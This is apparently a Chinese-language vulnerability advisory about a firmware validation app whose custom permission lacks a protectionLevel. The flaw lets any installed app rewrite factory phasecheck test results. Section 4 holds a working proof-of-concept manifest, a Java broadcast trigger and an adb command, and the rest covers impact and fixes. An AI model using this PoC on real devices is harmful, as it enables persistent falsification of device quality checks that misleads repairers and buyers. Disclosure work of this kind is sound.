# V17 — `SAVE_PHASECHECK` 权限未定级，任意应用可篡改 phasecheck 全部 station

| 项 | 值 |
|----|----|
| **严重性** | 🟠 高 |
| **CWE** | CWE-732 Incorrect Permission Assignment for Critical Resource<br>CWE-306 Missing Authentication for Critical Function |
| **受影响应用** | `com.sprd.validationtools` (MMITools.apk, /system/app) |
| **UID** | **1000 (android.uid.system)** |
| **组件** | `com.sprd.validationtools.PhaseCheckBroadcastReceiver` |
| **exported** | `true` |
| **permission** | `com.android.permission.SAVE_PHASECHECK` |
| **权限 protectionLevel** | **未声明 → 默认 `normal`** |
| **action** | `com.sprd.validationtools.SAVE_PHASECHECK` |
| **SELinux 域** | `sprd_validationtools_app` |
| **实机验证** | 静态确认（实测受阻，见第 5 节） |

---

## 1. 摘要

`PhaseCheckBroadcastReceiver` 受自定义权限 `com.android.permission.SAVE_PHASECHECK`
保护，表面看是一个「受保护的导出组件」。但该权限在 `MMITools` 的清单中
**只声明了名字，没有声明 `protectionLevel`**：

```xml
<permission android:name="com.android.permission.SAVE_PHASECHECK" />
```

Android 对未指定 `protectionLevel` 的自定义权限默认取 **`normal`**。
`normal` 级权限**由系统在安装时自动授予**，用户无需确认、不弹窗、
也无法在设置里撤销。

结果是：任何第三方应用只要在自己的清单里写一行

```xml
<uses-permission android:name="com.android.permission.SAVE_PHASECHECK"/>
```

即可在安装后**无条件获得**该权限，然后向 `PhaseCheckBroadcastReceiver`
发送广播，把 phasecheck 分区中**任意 station** 标记为 PASS 或 FAIL。

> 与 V06 / V16 的区别：V06 固定只能改 `AUDIO`，V16 改 miscdata 出厂标识；
> V17 可以改**任意 station 的测试结果**，覆盖面最广。
> 且它是「权限未定级」这一配置错误，修复方式完全不同。

## 2. 漏洞代码

### 2.1 权限声明（关键）

```xml
<!-- MMITools/AndroidManifest.xml -->
<!-- 全文件唯一的 <permission> 声明，仅此一条 -->
<permission android:name="com.android.permission.SAVE_PHASECHECK" />
```

对比同固件内正确的写法（`com.baidu.duerguard`）：

```xml
<permission android:name="com.baidu.duerguard.read"
            android:protectionLevel="signatureOrSystem" />
<permission android:name="com.baidu.duerguard.viewprivacy"
            android:protectionLevel="signatureOrSystem" />
```

两处对照可排除「反编译丢失属性」的可能：同一套 apktool 版本，
Duerguard 的 `protectionLevel` 完整保留，MMITools 的确实没有。

### 2.2 组件声明

```xml
<receiver android:name="com.sprd.validationtools.PhaseCheckBroadcastReceiver"
          android:permission="com.android.permission.SAVE_PHASECHECK"
          android:exported="true">
    <intent-filter>
        <action android:name="com.sprd.validationtools.SAVE_PHASECHECK" />
    </intent-filter>
</receiver>
```

### 2.3 业务逻辑

```java
// PhaseCheckBroadcastReceiver.java
private static final String ACTION_SAVE_PHASECHECK        = "com.sprd.validationtools.SAVE_PHASECHECK";
private static final String SAVE_PHASECHECK_RESULT        = "station_result";
private static final String SAVE_PHASECHECK_STATION_NAME  = "station_name";

static class SavePhasecheckAsyncTask extends AsyncTask<String, Void, Void> {
    @Override
    protected Void doInBackground(String... strArr) {
        if (strArr == null || strArr.length < 2) return null;
        this.station = strArr[0];      // ← 任意 station 名
        this.result  = strArr[1];      // "0" = PASS, "1" = FAIL
        if ("0".equals(this.result)) {
            PhaseCheckParse.getInstance().writeStationTested(this.station);
            PhaseCheckParse.getInstance().writeStationPass(this.station);
            return null;
        }
        if (!"1".equals(this.result)) return null;
        PhaseCheckParse.getInstance().writeStationTested(this.station);
        PhaseCheckParse.getInstance().writeStationFail(this.station);
        return null;
    }
}

@Override
public void onReceive(Context context, Intent intent) {
    String action = intent.getAction();
    if (action != null && action.equals(ACTION_SAVE_PHASECHECK)) {
        String station = intent.getStringExtra(SAVE_PHASECHECK_STATION_NAME);
        String result  = intent.getStringExtra(SAVE_PHASECHECK_RESULT);
        new SavePhasecheckAsyncTask()
            .executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, station, result);
    }
}
```

**`station` 完全没有白名单校验**，直接传给
`writeStationTested(String)` → `getStationTest(String)`，后者从
`phasecheckserver` 取回 station 名列表（`"AUDIO|CAMERA|TP|..."`），
在该列表中查找匹配项并返回索引，随后按索引置位。

因此只要能枚举出 station 名（会出现在 MMITools / EngineerMode 的
测试列表里），就能修改任意一项。

## 3. 影响

1. **任意 station 结果被篡改** —— 包括音频、摄像头、TP、传感器、
   充电、按键等全部单项测试
2. **良品/坏品判定被颠倒** —— 坏机的失败项可被标成 PASS，
   绕过返修、质检、二手流转中的检测环节
3. **持久化** —— 写入 phasecheck 分区，恢复出厂设置不会清除
4. **零交互** —— `normal` 权限安装即授予，无需用户点击任何确认
5. **无需 adb** —— 与 V16 不同，本漏洞可由普通第三方应用在
   运行期静默触发（V16 需要 `am start` 或有 activity 启动能力）

## 4. 复现

### 4.1 前置：攻击者应用清单

```xml
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.poc.phasecheck">

    <!-- 关键一行：声明即自动获得，无任何弹窗 -->
    <uses-permission android:name="com.android.permission.SAVE_PHASECHECK"/>

    <application android:label="PhaseCheckPoC">
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```

### 4.2 触发代码

```java
Intent i = new Intent("com.sprd.validationtools.SAVE_PHASECHECK");
i.setClassName("com.sprd.validationtools",
               "com.sprd.validationtools.PhaseCheckBroadcastReceiver");
i.putExtra("station_name", "AUDIO");   // 换成任意 station
i.putExtra("station_result", "0");     // "0"=PASS, "1"=FAIL
sendBroadcast(i);
```

### 4.3 纯 adb 侧验证（需要 shell 已持有该权限，通常不具备）

```bash
# shell (UID 2000) 并不自动持有该权限，直接发会被拒
adb shell am broadcast \
  -a com.sprd.validationtools.SAVE_PHASECHECK \
  -n com.sprd.validationtools/com.sprd.validationtools.PhaseCheckBroadcastReceiver \
  --es station_name "AUDIO" --es station_result "0"
```

> 注意：`am broadcast` 以 shell 身份执行，**不会**因为组件导出就通过
> 权限检查。这正是本漏洞与 V06/V16 的关键差异——它**必须**由一个
> 声明了 `SAVE_PHASECHECK` 的已安装应用来触发。

### 4.4 验证

MMITools → 单项测试，观察对应 station 的结果显示；
或 EngineerMode → 查看 phasecheck 结果。

### 4.5 回滚

再发一次 `station_result = "1"` 可标回 FAIL，但**无法恢复原始状态**：
`writeStationTested` 会把该 station 的「已测」标记一并置位，
原始值（未测 / 已测但失败）无法还原。

> 与 V06 相同的限制：`PhaseCheckParse` 提供了 `getPhaseCheck()` /
> `getStationResult()` 等读取 API，但**没有导出组件暴露它们**，
> 因此无法先读原值再写回。回滚只能依赖产线工具或重刷 phasecheck。

## 5. 实机验证受阻说明

本次审计**未能完成实机验证**，原因如下（记录以便后续复现）：

| 尝试 | 结果 |
|------|------|
| `super_admin:shell`（Shizuku/Root 通道） | `accessibility executor unavailable`，通道不可用 |
| Ubuntu 侧 `adb` | 命令不存在（proot 环境，无 adb 二进制） |
| `pm install` 安装 PoC APK | 无可用安装通道 |

**静态证据链完整**，可信度评估：

| 环节 | 证据强度 |
|------|---------|
| 权限缺 `protectionLevel` | ✅ 已从反编译清单原文确认，且有 Duerguard 作阳性对照 |
| Android 默认 normal | ✅ 平台行为，`frameworks/base` 中 `PermissionInfo` 默认值 |
| 组件 exported 且 action 匹配 | ✅ 清单原文确认 |
| station 无白名单 | ✅ 源码确认 |
| SELinux 放行 socket | ✅ `(allow sprd_validationtools_app phasecheckserver (unix_stream_socket (connectto)))` |

唯一未经验证的是「实际安装后权限确实被自动授予」这一步。
这是 Android 平台的既定行为，风险极低，但仍应在报告中如实标注。

## 6. 修复建议

### 6.1 首选：补上 protectionLevel

```xml
<permission android:name="com.android.permission.SAVE_PHASECHECK"
            android:protectionLevel="signatureOrSystem" />
```

⚠️ **注意**：修改已有权限的 `protectionLevel` 会使已安装应用失去该权限，
需评估是否影响产线工具。若担心兼容性，可改用新权限名
（如 `com.sprd.validationtools.permission.SAVE_PHASECHECK`）并保留旧权限
一段时间。

### 6.2 纵深防御：代码层校验

```java
@Override
public void onReceive(Context context, Intent intent) {
    // 1. 校验调用方 UID
    int uid = Binder.getCallingUid();
    if (uid != Process.SYSTEM_UID && uid != Process.SHELL_UID) {
        Log.w(TAG, "reject caller uid " + uid);
        return;
    }
    // 2. station 白名单
    String station = intent.getStringExtra(SAVE_PHASECHECK_STATION_NAME);
    if (!ALLOWED_STATIONS.contains(station)) {
        Log.w(TAG, "reject station " + station);
        return;
    }
    ...
}
```

### 6.3 同批排查

本次审计在同一固件中发现**同类问题**：

```xml
<!-- QmmiBroadcastReceiver 引用了这个权限，但全设备没有任何 APK 声明它 -->
<receiver android:name="com.sprd.validationtools.difference.receiver.QmmiBroadcastReceiver"
          android:permission="com.example.receiver.receivebroadcast"
          android:exported="true" />
```

该权限**未被任何清单声明**，属于「引用了不存在的权限」。Android 对这种
情况的处理是**拒绝所有调用方**（因为没有应用能被授予该权限），
所以保护实际有效——但这是**偶然的保护**，一旦将来某个包声明了同名
`normal` 权限，保护会立即失效。建议一并整改为显式声明的
`signatureOrSystem` 权限。

## 7. 权限定级横向对照

同一固件内自定义权限的实际定级情况：

| 权限 | 声明方 | protectionLevel | 评价 |
|------|--------|-----------------|------|
| `com.android.permission.SAVE_PHASECHECK` | MMITools | **缺失（normal）** | ❌ 本次漏洞 |
| `com.example.receiver.receivebroadcast` | **未声明** | 不存在 | ⚠️ 偶然有效 |
| `com.baidu.duerguard.read` | Duerguard | `signatureOrSystem` | ✅ |
| `com.baidu.duerguard.viewprivacy` | Duerguard | `signatureOrSystem` | ✅ |
| `com.baidu.duerguard.permission.sofire.RECEIVE` | Duerguard | `signatureOrSystem` | ✅ |

建议对全固件自定义权限做一次统一审计：凡是被用于保护**导出组件**的自定义
权限，必须显式声明 `signature` 或 `signatureOrSystem`，且权限名应带
完整包名前缀（`com.android.permission.*` 是 AOSP 保留命名空间，
第三方使用本身就不规范）。